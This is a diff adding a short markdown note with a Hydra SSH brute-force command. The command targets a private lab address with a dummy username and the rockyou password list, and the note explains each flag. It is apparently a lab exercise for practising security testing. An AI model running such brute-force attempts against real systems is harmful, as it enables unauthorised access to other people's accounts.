@@ -1,0 +1,10 @@
+# Hydra SSH Brute Force Simulation Command
+
+hydra -l fakeuser -P /usr/share/wordlists/rockyou.txt \
+ssh://192.168.71.130 -t 4 -V
+
+
+- -l fakeuser → Username to test
+- -P → Password list
+- -t 4 → Parallel threads
+- -V → Verbose output
